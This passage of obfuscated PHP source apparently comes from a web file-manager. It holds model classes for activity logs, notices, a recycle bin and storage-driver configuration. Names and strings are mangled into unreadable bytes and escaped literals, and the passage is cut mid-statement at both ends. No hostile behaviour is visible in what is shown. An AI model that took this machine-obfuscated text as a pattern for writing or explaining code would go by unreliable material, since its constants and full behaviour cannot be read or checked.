$Íæ–©«[$”Îß”ø[510]][$”Îß”ø[1235]]; $Á­İú¬ƒ[] = $Íæ–©«[$”Îß”ø[510]][$”Îß”ø[1236]]; } if ($Íæ–©«[$”Îß”ø[33]] == $”Îß”ø[2221]) { $Á­İú¬ƒ[] = $Íæ–©«[$”Îß”ø[510]][$”Îß”ø[193]]; } } if (!$Á­İú¬ƒ) { return array(); } return Model($”Îß”ø[889])->sourceListInfo($Á­İú¬ƒ, !0); } private function logList($ƒ‚åì¤€) { $äÛ‹÷†Ñ =& $_SERVER[÷åé¼î]; $á€©˜ñÚ = array_to_keyvalue($ƒ‚åì¤€, $äÛ‹÷†Ñ[12], $äÛ‹÷†Ñ[1779]); $şºí†Æğ = Model($äÛ‹÷†Ñ[582])->userListInfo(array_unique($á€©˜ñÚ)); $¿¿»×´š = $this->getSourceList($ƒ‚åì¤€); $ÂÙ“Ş“Û = $this->typeAll(); $´é»Õƒì = array(); $ĞÃü¶Å = array(); foreach ($ƒ‚åì¤€ as $šıÂ®¿± => $¢—º€ƒ¨) { $Ÿò¦˜û = $¢—º€ƒ¨[$äÛ‹÷†Ñ[33]]; $‚üö“² = isset($şºí†Æğ[$¢—º€ƒ¨[$äÛ‹÷†Ñ[1779]]]) ? $şºí†Æğ[$¢—º€ƒ¨[$äÛ‹÷†Ñ[1779]]] : !1; $ó­Òç²× = strpos($Ÿò¦˜û, $äÛ‹÷†Ñ[2435]) === 0 ? LNG($äÛ‹÷†Ñ[2436]) : LNG($äÛ‹÷†Ñ[2431]); $¢—º€ƒ¨[$äÛ‹÷†Ñ[32]] = isset($‚üö“²[$äÛ‹÷†Ñ[32]]) ? $‚üö“²[$äÛ‹÷†Ñ[32]] : LNG($äÛ‹÷†Ñ[2431]); $¢—º€ƒ¨[$äÛ‹÷†Ñ[2265]] = isset($‚üö“²[$äÛ‹÷†Ñ[2265]]) ? $‚üö“²[$äÛ‹÷†Ñ[2265]] : $äÛ‹÷†Ñ[12]; $¢—º€ƒ¨[$äÛ‹÷†Ñ[1668]] = isset($ÂÙ“Ş“Û[$Ÿò¦˜û]) ? $ÂÙ“Ş“Û[$Ÿò¦˜û] : $ó­Òç²×; $¢—º€ƒ¨[$äÛ‹÷†Ñ[2153]] = $‚üö“²; $ö´“ğû = json_decode($¢—º€ƒ¨[$äÛ‹÷†Ñ[510]], !0); $¢—º€ƒ¨[$äÛ‹÷†Ñ[2428]] = isset($ö´“ğû[$äÛ‹÷†Ñ[2428]]) ? $ö´“ğû[$äÛ‹÷†Ñ[2428]] : $äÛ‹÷†Ñ[12]; $¢—º€ƒ¨[$äÛ‹÷†Ñ[2432]] = IpLocation::get($¢—º€ƒ¨[$äÛ‹÷†Ñ[2428]]); if (strpos($Ÿò¦˜û, $äÛ‹÷†Ñ[2212]) === 0 || isset($ö´“ğû[$äÛ‹÷†Ñ[2210]])) { $ö´“ğû[$äÛ‹÷†Ñ[90]] = $¿¿»×´š[$ö´“ğû[$äÛ‹÷†Ñ[193]]]; $ö´“ğû[$äÛ‹÷†Ñ[2226]] = $¿¿»×´š[$ö´“ğû[$äÛ‹÷†Ñ[2210]]]; if ($ö´“ğû[$äÛ‹÷†Ñ[33]] == $äÛ‹÷†Ñ[604]) { $ö´“ğû[$äÛ‹÷†Ñ[510]][$äÛ‹÷†Ñ[1235]] = $¿¿»×´š[$ö´“ğû[$äÛ‹÷†Ñ[510]][$äÛ‹÷†Ñ[1235]]]; $ö´“ğû[$äÛ‹÷†Ñ[510]][$äÛ‹÷†Ñ[1236]] = $¿¿»×´š[$ö´“ğû[$äÛ‹÷†Ñ[510]][$äÛ‹÷†Ñ[1236]]]; } if ($ö´“ğû[$äÛ‹÷†Ñ[33]] == $äÛ‹÷†Ñ[2221]) { $ö´“ğû[$äÛ‹÷†Ñ[510]][$äÛ‹÷†Ñ[193]] = $¿¿»×´š[$ö´“ğû[$äÛ‹÷†Ñ[510]][$äÛ‹÷†Ñ[193]]]; } if ($ö´“ğû[$äÛ‹÷†Ñ[33]] == $äÛ‹÷†Ñ[1946]) { $ö´“ğû[$äÛ‹÷†Ñ[2226]] = $ö´“ğû[$äÛ‹÷†Ñ[90]]; $ö´“ğû[$äÛ‹÷†Ñ[2210]] = $ö´“ğû[$äÛ‹÷†Ñ[2226]][$äÛ‹÷†Ñ[193]]; $ö´“ğû[$äÛ‹÷†Ñ[90]] = !1; $ö´“ğû[$äÛ‹÷†Ñ[193]] = $äÛ‹÷†Ñ[12]; } $‚ˆ¢·¿ = array($äÛ‹÷†Ñ[1946], $äÛ‹÷†Ñ[2208]); if (!in_array($ö´“ğû[$äÛ‹÷†Ñ[33]], $‚ˆ¢·¿)) { if ($ö´“ğû[$äÛ‹÷†Ñ[90]] && $ö´“ğû[$äÛ‹÷†Ñ[90]][$äÛ‹÷†Ñ[190]] == $äÛ‹÷†Ñ[191]) { $ĞÃü¶Å[] = $¢—º€ƒ¨[$äÛ‹÷†Ñ[459]]; unset($ƒ‚åì¤€[$šıÂ®¿±]); continue; } if ($ö´“ğû[$äÛ‹÷†Ñ[2226]] && $ö´“ğû[$äÛ‹÷†Ñ[2226]][$äÛ‹÷†Ñ[190]] == $äÛ‹÷†Ñ[191]) { $ĞÃü¶Å[] = $¢—º€ƒ¨[$äÛ‹÷†Ñ[459]]; unset($ƒ‚åì¤€[$šıÂ®¿±]); continue; } } } $¢—º€ƒ¨[$äÛ‹÷†Ñ[510]] = $ö´“ğû; unset($¢—º€ƒ¨[$äÛ‹÷†Ñ[2437]]); $´é»Õƒì[] = $¢—º€ƒ¨; } $this->clearSystemPathLog($ĞÃü¶Å); return $´é»Õƒì; } private function clearSystemPathLog($ş“Ÿ£Â) { $Í‰Éãƒå =& $_SERVER[÷åé¼î]; if (count($ş“Ÿ£Â) == 0) { return; } $›í¡µş” = array($Í‰Éãƒå[459] => array($Í‰Éãƒå[7], array_unique($ş“Ÿ£Â))); $this->where($›í¡µş”)->delete(); } public function deviceList($ü”“, $¿á¤¡„“ = 0) { $¾×È–õ“ =& $_SERVER[÷åé¼î]; $åâÑÂ¿× = array($¾×È–õ“[1779] => $ü”“, $¾×È–õ“[231] => array($¾×È–õ“[1086], $¿á¤¡„“), $¾×È–õ“[33] => $¾×È–õ“[1920]); $ÈÁŞé£¹ = array(); $ò”·È¤ä = $this->field($¾×È–õ“[2438])->where($åâÑÂ¿×)->order($¾×È–õ“[2224])->limit(50)->select(); foreach ($ò”·È¤ä as $ùÁº => $Ìœ•ö˜•) { if ($ùÁº > 0 && abs($Ìœ•ö˜•[$¾×È–õ“[231]] - $ò”·È¤ä[$ùÁº - 1][$¾×È–õ“[231]]) < 5) { continue; } $Ä³â—½Ë = json_decode($Ìœ•ö˜•[$¾×È–õ“[510]], !0); $Ìœ•ö˜•[$¾×È–õ“[2428]] = isset($Ä³â—½Ë[$¾×È–õ“[2428]]) ? $Ä³â—½Ë[$¾×È–õ“[2428]] : $¾×È–õ“[12]; unset($Ä³â—½Ë[$¾×È–õ“[2428]]); $üìçÆèº = $this->deviceType($Ä³â—½Ë[$¾×È–õ“[2213]]); if (isset($ÈÁŞé£¹[$üìçÆèº])) { continue; } $Ìœ•ö˜•[$¾×È–õ“[2432]] = IpLocation::get($Ìœ•ö˜•[$¾×È–õ“[2428]]); $Ìœ•ö˜•[$¾×È–õ“[510]] = $Ä³â—½Ë; $ÈÁŞé£¹[$üìçÆèº] = $Ìœ•ö˜•; } return array_values($ÈÁŞé£¹); } public function deviceType($ÓØº“¹¢) { return $ÓØº“¹¢; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x6e\157\x74\151\143\145\114\x69\163\x74"; public $field = array("\156\141\155\145", "\x63\157\156\164\145\x6e\x74", "\x61\165\164\150", "\155\x6f\144\145", "\164\x69\155\145", "\164\171\160\145", "\154\145\166\x65\154", "\145\156\141\142\154\145", "\x73\157\x72\164"); public function listData($¸ŞñËÅ = false, $±âÆèÎ¼ = "\x73\157\x72\x74", $“Ïå³°ù = false) { return parent::listData($¸ŞñËÅ, $±âÆèÎ¼, $“Ïå³°ù); } public function add($µ°şÌ•ë) { $ˆºÉÁÄ =& $_SERVER[÷åé¼î]; $àË¨½Äü = time(); if ($µ°şÌ•ë[$ˆºÉÁÄ[16]] == $ˆºÉÁÄ[2439]) { $àË¨½Äü = strtotime($µ°şÌ•ë[$ˆºÉÁÄ[206]]); } $µ°şÌ•ë[$ˆºÉÁÄ[206]] = $àË¨½Äü; return parent::insert($µ°şÌ•ë); } public function update($îÃ½İÇÍ, $ÃĞ÷Á‹Í) { $‘€ßñíÑ =& $_SERVER[÷åé¼î]; $°•ı…é³ = $this->listData($îÃ½İÇÍ); if (!$°•ı…é³) { return !1; } $²ƒØÍÈÒ = time(); if ($ÃĞ÷Á‹Í[$‘€ßñíÑ[16]] == $‘€ßñíÑ[2439]) { $²ƒØÍÈÒ = strtotime($ÃĞ÷Á‹Í[$‘€ßñíÑ[206]]); } $ÃĞ÷Á‹Í[$‘€ßñíÑ[206]] = $²ƒØÍÈÒ; return parent::update($îÃ½İÇÍ, $ÃĞ÷Á‹Í); } public function remove($ï÷–ßÓÆ) { $€ó’¢¬ = $this->listData($ï÷–ßÓÆ); if (!$€ó’¢¬ || $€ó’¢¬[$_SERVER[÷åé¼î][191]]) { return !1; } return parent::remove($ï÷–ßÓÆ); } public function sort($ÓÄ˜ƒşÔ, $É–÷ªúå) { return parent::update($ÓÄ˜ƒşÔ, $É–÷ªúå); } public function enable($•£‚ÈÃã, $ÓÅÙ¯Û¯) { return parent::update($•£‚ÈÃã, array($_SERVER[÷åé¼î][2440] => $ÓÅÙ¯Û¯)); } private function initUserOption() { $¥°ĞŞŒ =& $_SERVER[÷åé¼î]; $this->optionType = $¥°ĞŞŒ[2441]; $this->modelType = $¥°ĞŞŒ[2442]; $this->field = array($¥°ĞŞŒ[2443], $¥°ĞŞŒ[32], $¥°ĞŞŒ[206], $¥°ĞŞŒ[33], $¥°ĞŞŒ[2444], $¥°ĞŞŒ[815], $¥°ĞŞŒ[226]); } public function userNoticeGet($õİÆì°š = false) { $this->initUserOption(); return parent::listData($õİÆì°š, $_SERVER[÷åé¼î][459], !0); } public function userNoticeAdd($ı‡¤ãß‡) { $šÔŞÄÃé =& $_SERVER[÷åé¼î]; $this->initUserOption(); $ææØ‚‹¬ = $this->findByKey($šÔŞÄÃé[2443], $ı‡¤ãß‡[$šÔŞÄÃé[459]]); if ($ææØ‚‹¬) { return !0; } $ÎÇüŠ¬¼ = array($šÔŞÄÃé[2443] => $ı‡¤ãß‡[$šÔŞÄÃé[459]], $šÔŞÄÃé[32] => $ı‡¤ãß‡[$šÔŞÄÃé[32]], $šÔŞÄÃé[206] => $ı‡¤ãß‡[$šÔŞÄÃé[206]], $šÔŞÄÃé[33] => isset($ı‡¤ãß‡[$šÔŞÄÃé[33]]) ? $ı‡¤ãß‡[$šÔŞÄÃé[33]] : 1, $šÔŞÄÃé[2444] => isset($ı‡¤ãß‡[$šÔŞÄÃé[2444]]) ? $ı‡¤ãß‡[$šÔŞÄÃé[2444]] : 0, $šÔŞÄÃé[815] => 0, $šÔŞÄÃé[226] => 0); return parent::insert($ÎÇüŠ¬¼); } public function userNoticeEdit($¢ğÅ½×÷, $Â»îş±â) { $this->initUserOption(); return parent::update($¢ğÅ½×÷, $Â»îş±â); } } goto C‡‡Â˜èëÆ; aÛå„§åÃ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\145\x5f\162\145\143\171\x63\154\x65"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\124\151\x6d\x65", "\164\151\x6d\x65", "\x69\x6e\163\145\162\x74", "\x66\165\x6e\143\x74\x69\x6f\156")); public function listData($’ë¥éº¼ = false) { $ÏôùˆÅƒ =& $_SERVER[÷åé¼î]; $’ë¥éº¼ = $’ë¥éº¼ ? $’ë¥éº¼ : USER_ID; $éñ¸ËÒŠ = $this->where(array($ÏôùˆÅƒ[1770] => $’ë¥éº¼))->select(); return array_to_keyvalue($éñ¸ËÒŠ, $ÏôùˆÅƒ[12], $ÏôùˆÅƒ[193]); } public function moveToRecycle($Â¬êååĞ) { $šıİ›‘€ =& $_SERVER[÷åé¼î]; $Æ¦Ãäè« = Model($šıİ›‘€[1414]); $°¿¦½ï± = $Æ¦Ãäè«->sourceInfo($Â¬êååĞ); if (!$°¿¦½ï± || $°¿¦½ï±[$šıİ›‘€[489]] == $šıİ›‘€[91]) { return; } $»»ñãŸ = array($šıİ›‘€[475] => $Â¬êååĞ, $šıİ›‘€[1770] => USER_ID, $šıİ›‘€[632] => $°¿¦½ï±[$šıİ›‘€[190]], $šıİ›‘€[633] => $°¿¦½ï±[$šıİ›‘€[553]], $šıİ›‘€[636] => $°¿¦½ï±[$šıİ›‘€[568]]); $this->add($»»ñãŸ); $this->recycleMove($Â¬êååĞ, 1); if ($°¿¦½ï±[$šıİ›‘€[469]] == $šıİ›‘€[91]) { $Î¶¶ºªï = array($šıİ›‘€[636] => array($šıİ›‘€[596], $°¿¦½ï±[$šıİ›‘€[568]] . $Â¬êååĞ . $šıİ›‘€[597])); $Æ¦Ãäè«->where($Î¶¶ºªï)->setField($šıİ›‘€[489], 1); } } public function clear() { $this->remove(!1); } public function remove($ÉÈ´øìô = false, $–¬…Œ¥Î = false) { $ßÌŞÆã› =& $_SERVER[÷åé¼î]; $–¬…Œ¥Î = $–¬…Œ¥Î ? $–¬…Œ¥Î : USER_ID; $í÷£ = Model($ßÌŞÆã›[1414]); $Õ½üÙ·™ = $this->listData($–¬…Œ¥Î); $ÉÈ´øìô = $ÉÈ´øìô === !1 ? !1 : $ÉÈ´øìô; $Ù­È«¼ = array(); foreach ($Õ½üÙ·™ as $İ‚²Áâ€) { if ($ÉÈ´øìô != !1 && !in_array($İ‚²Áâ€, $ÉÈ´øìô)) { continue; } $©ÈĞ«° = $í÷£->sourceInfo($İ‚²Áâ€); $í÷£->remove($İ‚²Áâ€, !1); $ğæÑıÍ¡ = $©ÈĞ«°[$ßÌŞÆã›[190]] . $ßÌŞÆã›[11] . $©ÈĞ«°[$ßÌŞÆã›[553]]; $Ù­È«¼[$ğæÑıÍ¡] = array($ßÌŞÆã›[632] => $©ÈĞ«°[$ßÌŞÆã›[190]], $ßÌŞÆã›[553] => $©ÈĞ«°[$ßÌŞÆã›[553]]); $this->where(array($ßÌŞÆã›[193] => $İ‚²Áâ€))->delete(); } foreach ($Ù­È«¼ as $ÜŒ”µó) { $í÷£->targetSpaceUpdate($ÜŒ”µó[$ßÌŞÆã›[190]], $ÜŒ”µó[$ßÌŞÆã›[553]]); } } public function restore($‡«×»³ñ = false) { $Í¾Æ÷Â = $this->listData(); $this->_restoreSource($Í¾Æ÷Â, $‡«×»³ñ); } public function removeUserAll($çïØÕ) { $this->remove(!1, $çïØÕ); } public function restoreItem($¡ÙèÙö¦) { $this->_restoreSource(array($¡ÙèÙö¦), array($¡ÙèÙö¦)); } private function _restoreSource($›ì“áñù, $×’œî½Á) { $ã†ÁĞşµ =& $_SERVER[÷åé¼î]; $øµÊë¦É = Model($ã†ÁĞşµ[1414]); $×’œî½Á = $×’œî½Á == !1 ? !1 : $×’œî½Á; if (!$›ì“áñù) { return !0; } $ÀçÈü¿í = array(); foreach ($›ì“áñù as $äË“¸¢é) { if ($×’œî½Á != !1 && !in_array($äË“¸¢é, $×’œî½Á)) { continue; } $ªöÆâåÆ = $øµÊë¦É->sourceInfo($äË“¸¢é); $íõ©¡Ş¾ = $øµÊë¦É->sourceInfo($ªöÆâåÆ[$ã†ÁĞşµ[192]]); if ($íõ©¡Ş¾[$ã†ÁĞşµ[489]] == $ã†ÁĞşµ[91]) { continue; } $øµÊë¦É->lockMoveStart($äË“¸¢é); $this->recycleMove($äË“¸¢é, 0); if ($ªöÆâåÆ[$ã†ÁĞşµ[469]] == $ã†ÁĞşµ[91]) { $²˜†¹Ã = array($ã†ÁĞşµ[636] => array($ã†ÁĞşµ[596], $ªöÆâåÆ[$ã†ÁĞşµ[568]] . $äË“¸¢é . $ã†ÁĞşµ[597])); $øµÊë¦É->where($²˜†¹Ã)->setField($ã†ÁĞşµ[489], 0); $this->restoreFolderChildren($äË“¸¢é, $›ì“áñù); } $this->where(array($ã†ÁĞşµ[193] => $äË“¸¢é))->delete(); $øµÊë¦É->folderSizeReset($ªöÆâåÆ[$ã†ÁĞşµ[192]]); $ÀçÈü¿í[] = $ªöÆâåÆ[$ã†ÁĞşµ[192]]; if ($ªöÆâåÆ[$ã†ÁĞşµ[469]] == $ã†ÁĞşµ[91]) { $ÀçÈü¿í[] = $äË“¸¢é; } $øµÊë¦É->lockMoveEnd($äË“¸¢é); } $øµÊë¦É->updateModifyTime($ÀçÈü¿í); } private function restoreFolderChildren($–®ƒ½Ò¬, $ò¨åé›Ç) { $øÑ®èŞ =& $_SERVER[÷åé¼î]; $Œº¹Ÿâ– = Model($øÑ®èŞ[1414]); $òœ‚†«Ğ = array($øÑ®èŞ[193] => array($øÑ®èŞ[7], array())); foreach ($ò¨åé›Ç as $Çşİê€×) { if ($Çşİê€× == $–®ƒ½Ò¬) { continue; } if (!$Œº¹Ÿâ–->isParentOf($–®ƒ½Ò¬, $Çşİê€×)) { continue; } $Šš—µ££ = $Œº¹Ÿâ–->sourceInfo($Çşİê€×); if ($Šš—µ££[$øÑ®èŞ[469]] == $øÑ®èŞ[91]) { $òœ‚†«Ğ[] = array($øÑ®èŞ[636] => array($øÑ®èŞ[596], $Šš—µ££[$øÑ®èŞ[568]] . $Çşİê€× . $øÑ®èŞ[597])); } else { $òœ‚†«Ğ[$øÑ®èŞ[193]][1][] = $Çşİê€×; } } if (!$òœ‚†«Ğ[$øÑ®èŞ[193]][1]) { unset($òœ‚†«Ğ[$øÑ®èŞ[193]]); } if (!$òœ‚†«Ğ) { return; } if (is_array($òœ‚†«Ğ[$øÑ®èŞ[193]]) && is_array($òœ‚†«Ğ[$øÑ®èŞ[193]][1])) { $òœ‚†«Ğ[$øÑ®èŞ[193]][1] = array_unique($òœ‚†«Ğ[$øÑ®èŞ[193]][1]); } $òœ‚†«Ğ[$øÑ®èŞ[1072]] = $øÑ®èŞ[2079]; $Œº¹Ÿâ–->where($òœ‚†«Ğ)->setField($øÑ®èŞ[489], 1); } private function recycleMove($ÉÑœ‹Ô©, $ØáÄæ = 1) { $¤šä‘óî =& $_SERVER[÷åé¼î]; $¸’ı—³ë = Model($¤šä‘óî[1414]); $ÚáúÁıÄ = Model($¤šä‘óî[2300]); $­ƒĞ”¡ø = array($¤šä‘óî[193] => $ÉÑœ‹Ô©); if ($ØáÄæ) { $¸’ı—³ë->where($­ƒĞ”¡ø)->setField($¤šä‘óî[489], 1); $ÚáúÁıÄ->eventRecycle($ÉÑœ‹Ô©, $¤šä‘óî[2301]); } else { $‘»»‡äå = $¸’ı—³ë->where($­ƒĞ”¡ø)->find(); $Ú¶³•´œ = $‘»»‡äå[$¤šä‘óî[469]] == $¤šä‘óî[91]; $Ñ—ì¬Ñİ = $¸’ı—³ë->fileNameAuto($‘»»‡äå[$¤šä‘óî[192]], $‘»»‡äå[$¤šä‘óî[32]], REPEAT_RENAME_FOLDER, $Ú¶³•´œ); if ($Ñ—ì¬Ñİ != $‘»»‡äå[$¤šä‘óî[32]]) { $¸’ı—³ë->rename($ÉÑœ‹Ô©, $Ñ—ì¬Ñİ); } $¸’ı—³ë->where($­ƒĞ”¡ø)->setField($¤šä‘óî[489], 0); $ÚáúÁıÄ->eventRecycle($ÉÑœ‹Ô©, $¤šä‘óî[2302]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\x73\x6f\165\x72\143\x65\123\x65\x63\162\145\x74\114\151\x73\x74"; public $field = array("\163\x6f\165\162\x63\x65\111\x44", "\x74\x79\160\145\111\x44", "\x63\162\x65\x61\164\145\125\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\163\x74\x6f\x72\141\x67\x65\114\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\x73\x69\x7a\x65\x4d\141\170", "\163\x79\x73\x74\145\155", "\144\145\146\x61\165\154\164", "\x64\x72\151\x76\x65\x72", "\143\157\x6e\x66\x69\147"); public function listData($Ø€ÊÇêç = false, $ƒó¹Ùƒ‘ = "\155\x6f\x64\151\146\x79\124\151\155\145", $…³»Ç©§ = false) { $úëÛ‰Ú =& $_SERVER[÷åé¼î]; $ñ†á‰ÀÄ = parent::listData($Ø€ÊÇêç, $ƒó¹Ùƒ‘, $…³»Ç©§); if ($Ø€ÊÇêç) { return $ñ†á‰ÀÄ; } $À«äĞâ = array(); if ($GLOBALS[$úëÛ‰Ú[2303]]) { $À«äĞâ = $this->ioSizeUseGet(array_to_keyvalue($ñ†á‰ÀÄ, $úëÛ‰Ú[12], $úëÛ‰Ú[459])); } foreach ($ñ†á‰ÀÄ as $¨ŞàºÎè => $†ĞéÓ¶¡) { unset($ñ†á‰ÀÄ[$¨ŞàºÎè][$úëÛ‰Ú[6]]); $ñ†á‰ÀÄ[$¨ŞàºÎè][$úëÛ‰Ú[1966]] = isset($À«äĞâ[$†ĞéÓ¶¡[$úëÛ‰Ú[459]]]) ? $À«äĞâ[$†ĞéÓ¶¡[$úëÛ‰Ú[459]]] : 0; } return $ñ†á‰ÀÄ; } public function ioSizeUseGet($û­º¹ä) { $ù«º¥ä« =& $_SERVER[÷åé¼î]; if (!$û­º¹ä) { return array(); } $œ×Î»¡ = $ù«º¥ä«[2304] . implode($ù«º¥ä«[50], $û­º¹ä); $Æø’ßËË = Cache::get($œ×Î»¡); if ($Æø’ßËË) { return $Æø’ßËË; } $Ÿ§®ÈŠ¯ = array($ù«º¥ä«[882] => $ù«º¥ä«[459], $ù«º¥ä«[2305] => $ù«º¥ä«[79]); $ÓšîíäÂ = array($ù«º¥ä«[882] => array($ù«º¥ä«[7], $û­º¹ä)); $Æø’ßËË = Model($ù«º¥ä«[854])->field($Ÿ§®ÈŠ¯)->where($ÓšîíäÂ)->group($ù«º¥ä«[882])->select(); $Æø’ßËË = array_to_keyvalue($Æø’ßËË, $ù«º¥ä«[459], $ù«º¥ä«[79]); Cache::set($œ×Î»¡, $Æø’ßËË, 600); return $Æø’ßËË; } public function getConfig($ÓÍó¹Ö¤) { $Ô•ï¶÷ = parent::listData($ÓÍó¹Ö¤); return json_decode($Ô•ï¶÷[$_SERVER[÷åé¼î][6]], !0); } public function update($‰¯¶ÓÀ, $·Â¢èÇü) { $üèŠç½Ú =& $_SERVER[÷åé¼î]; $ô±ˆ—¶ = $·Â¢èÇü[$üèŠç½Ú[32]]; $óÍ£úÇ = array_to_keyvalue(parent::listData(), $üèŠç½Ú[32]); if (isset($óÍ£úÇ[$ô±ˆ—¶]) && $óÍ£úÇ[$ô±ˆ—¶][$üèŠç½Ú[459]] != $‰¯¶ÓÀ) { return !1; } $this->checkPwd($‰¯¶ÓÀ, $·Â¢èÇü); if (isset($·Â¢èÇü[$üèŠç½Ú[2306]]) && $·Â¢èÇü[$üèŠç½Ú[2306]] == $üèŠç½Ú[91]) { $this->checkConfig($·Â¢èÇü); } unset($·Â¢èÇü[$üèŠç½Ú[2306]]); $ÍË˜É‡ = parent::update($‰¯¶ÓÀ, $·Â¢èÇü); if ($ÍË˜É‡ && $·Â¢èÇü[$üèŠç½Ú[37]]) { $©½ÎÆ× = 0; foreach ($óÍ£úÇ as $…ÚŞíŞ) { if ($…ÚŞíŞ[$üèŠç½Ú[37]] && $…ÚŞíŞ[$üèŠç½Ú[459]] != $‰¯¶ÓÀ) { $©½ÎÆ× = $…ÚŞíŞ[$üèŠç½Ú[459]]; parent::update($…ÚŞíŞ[$üèŠç½Ú[459]], array($üèŠç½Ú[37] => 0)); } } $this->updateBackup($‰¯¶ÓÀ, $©½ÎÆ×); } return $ÍË˜É‡; } public function add($ãÏ‹¢) { $ƒœïÛ¤Ì =& $_SERVER[÷åé¼î]; $ÀßƒãÕî = array_to_keyvalue(parent::listData(), $ƒœïÛ¤Ì[32]); if (isset($ÀßƒãÕî[$ãÏ‹¢[$ƒœïÛ¤Ì[32]]])) { return !1; } $this->checkConfig($ãÏ‹¢); $ëÒÊ’ç = parent::insert($ãÏ‹¢); if ($ëÒÊ’ç && $ãÏ‹¢[$ƒœïÛ¤Ì[37]]) { foreach ($ÀßƒãÕî as $åÅÀ»ˆå) { if ($åÅÀ»ˆå[$ƒœïÛ¤Ì[37]]) { parent::update($åÅÀ»ˆå[$ƒœïÛ¤Ì[459]], array($ƒœïÛ¤Ì[37] => 0)); } } } return $ëÒÊ’ç; } public function updateBackup($ùıáÊü, $Å‡³“Ôó) { $…‚ŞÜ  =& $_SERVER[÷åé¼î]; if (!$Å‡³“Ôó) { return; } $©ÕÅ¦»Ë = Model($…‚ŞÜ [813])->config(); if ($©ÕÅ¦»Ë[$…‚ŞÜ [1749]] != $…‚ŞÜ [91] || $©ÕÅ¦»Ë[$…‚ŞÜ [817]] != $Å‡³“Ôó) { return; } $ß‡†Òå× = Model($…‚ŞÜ [835])->get($…‚ŞÜ [848]); $ß‡†Òå× = json_decode($ß‡†Òå×, !0); if (!$ß‡†Òå×) { return; } $ß‡†Òå×[$…‚ŞÜ [817]] = $ùıáÊü; Model($…‚ŞÜ [835])->set(array($…‚ŞÜ [848] => $ß‡†Òå×)); } public function checkPwd($ãŠªß£Ü, &$ËÓñô‚…) { $–Ö¶ò¯ı =& $_SERVER[÷åé¼î]; if (empty($ËÓñô‚…[$–Ö¶ò¯ı[6]])) { return; } $†ÆÔòŠˆ = json_decode($ËÓñô‚…[$–Ö¶ò¯ı[6]], !0); $»¼¢²ñÍ = $–Ö¶ò¯ı[12]; $ìûØŠÚ = array($–Ö¶ò¯ı[2307], $–Ö¶ò¯ı[2308], $–Ö¶ò¯ı[961]); foreach ($ìûØŠÚ as $šÙ¨çŸ†) { if (isset($†ÆÔòŠˆ[$šÙ¨çŸ†])) { $»¼¢²ñÍ = $šÙ¨çŸ†; break; } } if (!$»¼¢²ñÍ) { return; } $ûòÚ’öˆ = $this->getConfig($ãŠªß£Ü); $ï»Ìô× = $ûòÚ’öˆ[$»¼¢²ñÍ]; $úÎ©ªóß = $†ÆÔòŠˆ[$»¼¢²ñÍ]; if ($úÎ©ªóß == str_repeat($–Ö¶ò¯ı[220], strlen($ï»Ìô×))) { $†ÆÔòŠˆ[$»¼¢²ñÍ] = $ï»Ìô×; $ËÓñô‚…[$–Ö¶ò¯ı[6]] = json_encode($†ÆÔòŠˆ); } else { if ($úÎ©ªóß != $ï»Ìô×) { $ËÓñô‚…[$–Ö¶ò¯ı[2306]] = $–Ö¶ò¯ı[91]; } } } public function checkConfig(&$éªÇºûÌ, $¸£‚¸§ù = false) { $ÂİŞØã• =& $_SERVER[÷åé¼î]; $ØößÎ´¬ = strtolower($éªÇºûÌ[$ÂİŞØã•[98]]); $ÁúŞ˜ÃÁ = json_decode($éªÇºûÌ[$ÂİŞØã•[6]], !0); foreach ($ÁúŞ˜ÃÁ as $¾±í›à» => $Ç­”ÚÂ¾) { if (is_string($Ç­”ÚÂ¾)) { $ÁúŞ˜ÃÁ[$¾±í›à»] = trim($Ç­”ÚÂ¾); } } $ÁúŞ˜ÃÁ[$ÂİŞØã•[2309]] = rand_string(6); $ìÒ¼­Àä = $GLOBALS[$ÂİŞØã•[6]][$ÂİŞØã•[92]][$ÂİŞØã•[890]]; $ñ’ õã° = isset($ìÒ¼­Àä[$ØößÎ´¬]) ? $ìÒ¼­Àä[$ØößÎ´¬] : ucfirst($ØößÎ´¬); $²®ßûî = $ÂİŞØã•[77] . $ñ’ õã°; if (!$ñ’ õã° || !class_exists($²®ßûî)) { if ($¸£‚¸§ù) { return LNG($ÂİŞØã•[2310]); } write_log(array($ÂİŞØã•[2311], $éªÇºûÌ, get_caller_info()), $ÂİŞØã•[215]); show_json(LNG($ÂİŞØã•[2310]), !1, $éªÇºûÌ); } $áË¨å§ø = new $²®ßûî($ÁúŞ˜ÃÁ); if (in_array($ØößÎ´¬, $áË¨å§ø->objectDriver)) { try { if (!$áË¨å§ø->isBucketCors() && !$áË¨å§ø->setBucketCors()) { $×ƒÙØ€ = LNG($ÂİŞØã•[2312]); $×ƒÙØ€ .= $ÂİŞØã•[2313] . LNG($ÂİŞØã•[2314]); } } catch (Exception $¢ºî­Ëû) { $×ƒÙØ€ = $¢ºî­Ëû->getMessage(); } if (isset($×ƒÙØ€)) { return $this->_parseError($×ƒÙØ€, $ØößÎ´¬, $¸£‚¸§ù); } if ($ØößÎ´¬ == $ÂİŞØã•[68] && !$áË¨å§ø->checkRegion()) { return $this->_parseError(LNG($ÂİŞØã•[2315]), $ØößÎ´¬, $¸£‚¸§ù); } } $ŒÔèãÚû = rtrim($ÁúŞ˜ÃÁ[$ÂİŞØã•[1256]], $ÂİŞØã•[8]) . $ÂİŞØã•[8]; $˜³šÖÎ… = $áË¨å§ø->getPath($ŒÔèãÚû . $ÂİŞØã•[1260]); try { if ($ØößÎ´¬ == $ÂİŞØã•[109]) { $áË¨å§ø->mkdir($ŒÔèãÚû); } $ç·É§È = $áË¨å§ø->mkfile($˜³šÖÎ…); if (!$ç·É§È) { $×ƒÙØ€ = LNG($ÂİŞØã•[2312]); } } catch (Exception $¢ºî­Ëû) { $×ƒÙØ€ = $¢ºî­Ëû->getMessage(); } if (isset($×ƒÙØ€)) { return $this->_parseError($×ƒÙØ€, $ØößÎ´¬, $¸£‚¸§ù); } $ÁúŞ˜ÃÁ[$ÂİŞØã•[1256]] = $ŒÔèãÚû; $éªÇºûÌ[$ÂİŞØã•[6]] = json_encode($ÁúŞ˜ÃÁ); 